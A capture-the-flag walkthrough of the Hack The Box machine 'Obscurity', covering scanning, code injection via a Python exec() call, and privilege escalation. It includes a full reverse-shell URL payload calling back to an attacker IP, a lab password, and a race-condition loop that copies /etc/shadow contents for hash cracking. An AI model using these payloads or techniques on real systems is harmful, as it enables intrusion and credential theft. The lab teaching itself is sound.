---
layout: default
---
## Obscurity
###### Retired [date]
![](https://www.hackthebox.eu/storage/avatars/8c606d79541774c87ab0ee5705821323.png)

##### Intro
Static code analysis! Initial foothold was very easy, user was a little more involved, and root was quick. Full-time developers would absolutely crush this box.

Start off with a quick nmap looking for open ports:
```bash
nmap -sS -n -n obscurity.htb -p 1-65535
```

![](https://yaboygmoney.github.io/htb/images/obscurity/nmap1.png)

nmap showed ssh and http open on 22 and 8080, respectively. For more information, I ran
```bash
nmap -sV -n obscurity.htb -p 22,80,8080 -oN nmap.results
```

![](https://yaboygmoney.github.io/htb/images/obscurity/nmap2.png)

It appears as though the website is being ran on a custom web server, confidently named BadHTTPServer. Open up ```http://obscurity.htb:8080``` in Firefox and land on a web page.

![](https://yaboygmoney.github.io/htb/images/obscurity/webpage.png)

Scrolling down, there's a note to the devs that the current source is located in a development directory.

![](https://yaboygmoney.github.io/htb/images/obscurity/devNote.png)

We can find this quickly with a tool called ```wfuzz```. ```wfuzz``` lets you fuzz particular segments of a URL by replacing what part you would like to fuzz with ```FUZZ```. All it needs is a wordlist and the URL. ```wfuzz``` will print out the result of each request it makes, so it's helpful to find only the responses that come back valid. To do that, just take on ```| grep -v 404``` to ingore the 404 File Not Found results. The whole command looks like
```bash
wfuzz -w /usr/share/wordlists/dirb/common.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py | grep -v 404
```

![](https://yaboygmoney.github.io/htb/images/obscurity/wfuzz.png)

wfuzz found the valid URL ```http://obscurity.htb:8080/develop/SuperSecureServer.py```. There, we can see the source code for the server.

![](https://yaboygmoney.github.io/htb/images/obscurity/serverCode.png)

Looking down towards the bottom of the code, there are some comments on a couple of lines of code.
```python
def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
```

The [exec](https://pythonprogramming.net/python-exec-tutorial/) builtin allows developers (and hackers) to execute python code from within that input. To abuse this for a shell, a netcat listener is required.
```bash
nc -nvlp 1234
````

Now that the listener is set up to catch the shell, we need to send a get request to
```bash
http://obscurity.htb:8080/';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This web request injects the [python reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) into the ```exec``` function, causing our payload to be executed. Make the request either via curl or through the browser (I went browser) and bam, shell.

![](https://yaboygmoney.github.io/htb/images/obscurity/initialShell.png)

Once we land on the machine as www-data, we need to elevate our privileges to get user. We can see in the user robert's home directory there is a ```SuperSecureCrypt.py``` file, as well as a ```passwordreminder.txt``` file. 

![](https://yaboygmoney.github.io/htb/images/obscurity/robertDir.png)

Looking at the ```SuperSecureCrypt.py```, the program takes an input file to encrypt or decrypt, a string value for the key, and an output file. 

![](https://yaboygmoney.github.io/htb/images/obscurity/parser.png)

We're also given ```check.txt``` file and the output of the encryption in the form of ```out.txt```. 

![](https://yaboygmoney.github.io/htb/images/obscurity/checkOut.png)

The cool part is that we don't need to reverse engineer the encryption process if we have two pieces already. We can just unmath it. To do that, I sent the input file to be decrypted as the output, the key as the contents of check.txt, and set the ```-d``` option. The output will be the key that was used to encyrpt the file.

```bash
python3 SuperSecureCrypt.py -i out.txt -k "$(cat check.txt)" -d -o /tmp/ybgm.txt
```
The result kicked out the key ```alexandrovich``` several times over. Now we can run the same command again but to decrypt the ```passwordreminder.txt``` file and passing the output of our previous command as the key.

![](https://yaboygmoney.github.io/htb/images/obscurity/keyCrack.png)

```bash
python3 SuperSecureCrypt.py -i passwordreminder.txt -k "($cat /tmp/ybgm.txt)" -o /tmp/ybgm2.txt -d
```

The contents of the new file contain robert's password: ```SecThruObsFTW```.

![](https://yaboygmoney.github.io/htb/images/obscurity/password.png)

Now we can SSH in as robert and get out of this web-based shell and more importantly: get user.

```bash
ssh robert@obscurity.htb
cat user.txt
```

![](https://yaboygmoney.github.io/htb/images/obscurity/user.png)

```sudo -l``` shows that we can run the ```/home/robert/BetterSSH/BetterSSH.py``` file as root.

![](https://yaboygmoney.github.io/htb/images/obscurity/sudoL.png)

The file has permissions of ```-rwxr-xr-x 1 root   root```. I can't change it, as root owns the file, so I need a different way than just overwriting or editing the file. I started looking through the code to find a vulnerability, similar to the web server I exploited earlier.

The code segment that we care the most about looks like this:
```python
path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break
```

This code is opening up ```/etc/shadow``` and writing the contents to a password file in ```/tmp/SSH``` with a random filename so later it can compare the results of a provided password to authenticate to this 'better' SSH application. Unfortunately, it's deleting the file as soon as it's finished with it, making it impossible to manually read it during program execution. 
```python
if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)
```

On first run, the code breaks because ```/tmp/SSH``` doesn't exist, so that needs to be created first.
```bash
mkdir /tmp/SSH
```

To catch the contents of the file that is written before it is deleted, I wrote a script that constantly reads the contents of the all of the files in the ```/tmp/SSH``` directory and write them to a new file that wouldn't be deleted. We need to read every file in this directory regardless of name, because the first line of the ```BetterSSH.py``` file is creating a random filename
```python
path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
```

The script to catch the temp files looks like:

```bash
#!/bin/bash

while :
do
  cat /tmp/SSH/* >> /tmp/results.txt
done
```
I kicked off that script and then I used another window to SSH back in as robert. Then I ran
```bash
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
and logged in as robert and then killed the execution of my other script. Then I opened the ```/tmp/results.txt``` file and had the contents of the shadow file.

![](https://yaboygmoney.github.io/htb/images/obscurity/dumped.png)

From there, it was as easy as running the hash through ```john``` and logging in.

![](https://yaboygmoney.github.io/htb/images/obscurity/crackedRoot.png)

![](https://yaboygmoney.github.io/htb/images/obscurity/root.png)

![](https://media.giphy.com/media/l4JySAWfMaY7w88sU/giphy.gif)
